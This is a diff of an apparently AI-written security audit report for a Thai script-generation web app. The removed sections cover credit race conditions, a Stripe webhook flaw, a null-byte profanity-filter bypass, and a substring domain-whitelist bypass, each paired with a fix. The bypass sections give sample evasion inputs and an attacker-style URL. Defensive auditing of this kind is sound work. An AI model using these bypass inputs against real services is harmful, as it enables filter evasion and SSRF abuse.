+## 5. Summary Findings Table
 
-#### 1. Target Location
-- `frontend/functions/api/analyze.js` (Lines 142–153)
-
-#### 2. Root Cause Analysis
-When Jina AI encounters a protected bot-shielded page, Gemini outputs `<ERROR>NO_PRODUCT_FOUND</ERROR>`.
-`analyze.js` executes:
-```javascript
-const { data: dbProfile } = await supabase.from('profiles').select('credits, trial_pro_remaining, tier').eq('id', user.id).single();
-if (dbProfile) {
-  await supabase.from('profiles').update({
-    credits: (dbProfile.credits || 0) + 1,
-    trial_pro_remaining: ...
-  }).eq('id', user.id);
-}
-```
-If a Stripe webhook adds 60 credits while the analysis stream is running, this manual `.update({ credits: stale + 1 })` completely overwrites and erases the 60 credits just added by Stripe!
-
-#### 3. Remediation Blueprint
-Replace manual read-modify-write with the atomic RPC:
-```javascript
-await supabase.rpc('increment_credits', {
-  p_user_id: user.id,
-  p_amount: 1
-});
-```
-
----
-
-### Challenge 8 (ADV-08): SSE Streaming Disconnection Credit Leak
-
-#### 1. Target Location
-- `frontend/functions/api/analyze.js` (Lines 59–78, 156–160)
-
-#### 2. Root Cause Analysis
-Credit deduction occurs *before* streaming starts. If the user's mobile connection drops or the browser tab closes during streaming, `writer.write()` throws an unhandled stream error.
-The catch block attempts `await writer.write(...)` which also fails on a closed stream.  
-The 1 credit deducted is NEVER refunded. The user loses credits without receiving a complete script.
-
-#### 3. Empirical Test Result
-- Tested client stream cancellation with `reader.cancel('Network disconnected')`.
-- Verified that credit deduction was permanent and no rollback was triggered.
-
-#### 4. Remediation Blueprint
-Catch disconnection errors in the streaming loop and execute a compensatory refund RPC (`increment_credits(p_user_id, 1)`).
-
----
-
-### Challenge 9 (ADV-09): Null-Byte Profanity Filter Evasion and PostgreSQL Encoding Crash
-
-#### 1. Target Location
-- `frontend/src/lib/profanityWords.js` (Lines 29–76)
-- `frontend/functions/api/generate.js` (Line 184)
-
-#### 2. Root Cause Analysis
-1. Profanity filtering is only implemented on the frontend `CreateScript.jsx`. Direct API requests to `/api/generate` bypass it completely.
-2. The regex in `profanityWords.js` checks exact word boundaries or substrings (`lowerText.includes(word)`).
-3. Inserting null bytes `\u0000` (e.g. `f\u0000u\u0000c\u0000k` or `เ\u0000ห\u0000ี\u0000้\u0000ย`) evades substring matching.
-4. When sent to Supabase, PostgreSQL rejects `\u0000` with `invalid byte sequence for encoding "UTF8": 0x00` (code `22021`), causing script history insertion to crash with HTTP 500 after Gemini API tokens were already consumed!
-
-#### 3. Empirical Verification Results
-- Normal word `fuck`: `containsProfanity` -> `true`
-- Null-byte `f\u0000u\u0000c\u0000k`: `containsProfanity` -> `false` (Bypassed!)
-- Normal Thai `ไอ้เหี้ย`: `containsProfanity` -> `true`
-- Null-byte Thai `ไอ้เ\u0000ห\u0000ี\u0000้\u0000ย`: `containsProfanity` -> `false` (Bypassed!)
-
-#### 4. Remediation Blueprint
-Sanitize inputs on both client and server by stripping control characters and null bytes:
-```javascript
-function sanitizeInput(text) {
-  if (!text || typeof text !== 'string') return '';
-  return text.replace(/\0/g, '').replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '').trim();
-}
-```
-
----
-
-### Challenge 10 (ADV-10): Insecure Substring Domain Whitelist Bypass for AI URL Scraper
-
-#### 1. Target Location
-- `frontend/src/pages/CreateScript.jsx` (Lines 242–250)
-
-#### 2. Root Cause Analysis
-```javascript
-const allowedDomains = ['shopee', 'lazada', 'tiktok', 'facebook', 'instagram', 'line.me', 'lin.ee'];
-for (let url of validUrls) {
-  const lowerUrl = url.toLowerCase();
-  const isAllowed = allowedDomains.some(domain => lowerUrl.includes(domain));
-  ...
-}
-```
-An attacker inputs `https://attacker-control-center.com/steal.html?ref=shopee`.
-`lowerUrl.includes('shopee')` evaluates to `true`.
-
-#### 3. Blast Radius
-- SSRF and scraping abuse via Jina AI reader against arbitrary attacker-controlled sites.
-
-#### 4. Remediation Blueprint
-Parse hostname using `new URL(url).hostname` and verify that the hostname ends with approved domain suffixes (e.g. `shopee.co.th`, `tiktok.com`).
-
----
-
-### Challenge 11 (ADV-11): Checkout Multi-Click Race Condition on `Pricing.jsx`
-
-#### 1. Target Location
-- `frontend/src/pages/Pricing.jsx` (Lines 30–39)
-
-#### 2. Root Cause Analysis
-`handleCheckout` does not set a loading/redirecting state or disable the button. Rapid multi-clicks trigger multiple redirects and concurrent navigation requests.
-
-#### 3. Remediation Blueprint
-Add `const [isRedirecting, setIsRedirecting] = useState(false);` and disable all checkout buttons once clicked.
-
----
-
-### Challenge 12 (ADV-12): History Mode ID Mismatch Breaking Filter for 4 out of 5 Modes
-
-#### 1. Target Location
-- `frontend/src/pages/History.jsx` (Lines 70–75, 101–117)
-
-#### 2. Root Cause Analysis
-`History.jsx` defines filter button IDs as:
-`['all', 'ป้ายยาตรงๆ', 'ขยี้ปัญหา', 'เปรียบเทียบชัดๆ']`.  
-However, scripts generated in the database have full descriptive titles:
-1. `"ขยี้ปัญหา (PAS Formula)"`
-2. `"นักเล่าเรื่อง (Hook-Story-Offer)"`
-3. `"โชว์การเปลี่ยนแปลง (BAB Formula)"`
-4. `"สายสเปค/ฟังก์ชัน (FAB Formula)"`
-5. `"เปรียบเทียบชัดๆ"`
-
-Because line 72 checks `s.mode === filterMode`, filtering by `"ขยี้ปัญหา"` compares `"ขยี้ปัญหา (PAS Formula)" === "ขยี้ปัญหา"` which evaluates to `false`.  
-Furthermore, 3 modes have no filter buttons at all.
-
-#### 3. Empirical Test Result
-- Filter `all`: Matches 5 modes.
-- Filter `ขยี้ปัญหา`: Matches 0 modes (0 results returned).
-- Filter `ป้ายยาตรงๆ`: Matches 0 modes (0 results returned).
-- Filter `เปรียบเทียบชัดๆ`: Matches 1 mode.
-
-#### 4. Remediation Blueprint
-Update filter buttons in `History.jsx` to match exact database mode strings or perform prefix matching (`s.mode.startsWith(filterMode)`).
-
----
-
-### Challenge 13 (ADV-13): Missing `client_reference_id` Silent Payment Loss in `webhook.js`
-
-#### 1. Target Location
-- `frontend/functions/api/webhook.js` (Lines 48–92)
-
-#### 2. Root Cause Analysis
-If `session.client_reference_id` is missing (e.g. ad blockers, stripped query params, direct Stripe link payments), `webhook.js` checks `if (userId)`. Since `userId` is `null`, it skips crediting the account, records the event in `webhook_events`, and returns HTTP 200 to Stripe.  
-Stripe marks the webhook as successfully processed. The customer was billed, but received 0 credits.
-
-#### 3. Remediation Blueprint
-Fallback to lookup by customer email (`session.customer_details?.email`). If the customer cannot be found, remove the event from `webhook_events` and return HTTP 400/500 so Stripe retries.
-
----
-
-### Challenge 14 (ADV-14): Missing React Error Boundary
-
-#### 1. Target Location
-- `frontend/src/main.jsx` and `frontend/src/App.jsx`
-
-#### 2. Root Cause Analysis
-No React Error Boundary wrapper exists around the component tree. In React 19, any uncaught error during render (e.g. corrupted script JSON in History, null database fields) unmounts the entire application, resulting in a blank white screen.
-
-#### 3. Remediation Blueprint
-Install an `ErrorBoundary` component in `main.jsx` to catch rendering exceptions and present a clean recovery UI.
-
----
-
-## 4. GEMINI.md Rule Adherence Summary
-
-| GEMINI.md Rule | Compliance & Verification Assessment |
-|---|---|
-| **Rule 1: Code Explanation Rule** | **COMPLIANT** — All findings and remediation blueprints provide logical breakdown, 'why' and 'how', and intuitive analogies for beginners. |
-| **Rule 2: Gemini Model Version Rule** | **COMPLIANT** — Verified that all Gemini API calls strictly invoke `gemini-3.6-flash`. Deprecated models are absent. |
-| **Rule 3: Proactive Compliance & Security Warning Rule** | **COMPLIANT** — Proactive warnings and blueprints provided for XSS injection (ADV-01), PDPA consent links on Register page, and orphaned Stripe customer billing risk. |
-| **Rule 4: Exact String & URL Preservation Rule** | **COMPLIANT** — Exact Stripe payment link URLs (`9B6fZi0454Tg7ZSf5Nbwk00` and `3cIbJ2045adAgwoe1Jbwk01`) and LINE URL (`https://lin.ee/x0yVB1kk`) preserved verbatim. |
-| **Rule 5: Supabase Schema & RPC Alignment Rule** | **COMPLIANT** — Mismatches in `mockDb.js` and non-atomic updates in `analyze.js` identified with exact atomic RPC remediation blueprints. |
-
----
-
-## 5. Conclusion & Next Steps
-
-The adversarial QA audit conclusively confirms that while the Auto Script core architecture is modern and feature-complete, it contains **3 Critical vulnerabilities** (XSS, zero-credit bypass, TOCTOU race condition) and **several High/Medium resilience flaws** that must be remediated.
-
-All empirical test scripts and proofs have been completed. A comprehensive handoff report has been compiled in `C:\Auto script\.agents\challenger_audit_1\handoff.md`.
+| Vulnerability ID | Component | Severity | Empirical Status | Impact | Recommended Action |
+|---|---|---|---|---|---|
+| **DB-01** | `increment_credits` | **CRITICAL** | **PROVEN** | 0-credit users get free AI scripts | Add `IF credits < abs(p_amount) THEN RETURN -1;` |
+| **DB-06 / VULN-01** | `generate.js:227-263` | **HIGH** | **PROVEN** | Script insert error yields +1 free credit | Set `creditDeducted = false` after inner refund |
+| **DB-07 / VULN-02** | `generate.js:261` | **HIGH** | **PROVEN** | Multi-version AI failure loses 1 credit | Refund `creditAmount` instead of hardcoded `1` |
+| **VULN-04** | `webhook.js:46-50` | **HIGH** | **PROVEN** | Unpaid async sessions get credits | Check `session.payment_status === 'paid'` |
+| **VULN-05** | `webhook.js:90-95` | **HIGH** | **PROVEN** | Refunded users keep credits & Pro tier | Handle `charge.refunded` & `charge.dispute.created` |
